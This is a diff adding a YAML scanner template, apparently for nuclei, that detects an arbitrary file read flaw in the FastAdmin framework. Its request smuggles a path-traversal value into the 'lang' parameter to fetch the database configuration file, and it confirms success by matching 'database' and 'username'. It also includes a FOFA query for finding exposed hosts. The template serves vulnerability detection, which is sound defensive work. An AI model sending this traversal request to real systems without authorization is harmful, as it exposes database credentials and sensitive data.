@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - jsonpReturn
+    - database
+    - username
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/index/ajax/lang?lang=..//..//application/database'
+id: fastadmin-framework-lfi
+info:
+  author: Co5mos
+  description: "Fastadmin\u6846\u67B6 lang\u63A5\u53E3\u5904\u5B58\u5728\u4EFB\u610F\
+    \u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u6076\u610F\u653B\u51FB\u8005\u53EF\
+    \u80FD\u5229\u7528\u8BE5\u6F0F\u6D1E\u8BFB\u53D6\u670D\u52A1\u5668\u4E0A\u7684\
+    \u654F\u611F\u6587\u4EF6\uFF0C\u4F8B\u5982\u5BA2\u6237\u8BB0\u5F55\u3001\u8D22\
+    \u52A1\u6570\u636E\u6216\u6E90\u4EE3\u7801\uFF0C\u5BFC\u81F4\u6570\u636E\u6CC4\
+    \u9732\u3002\n"
+  metadata:
+    fofa-query: icon_hash="-1036943727"
+  name: Fastadmin Framework - Arbitrary File Read
+  severity: critical
+  tags: lfi, fastadmin
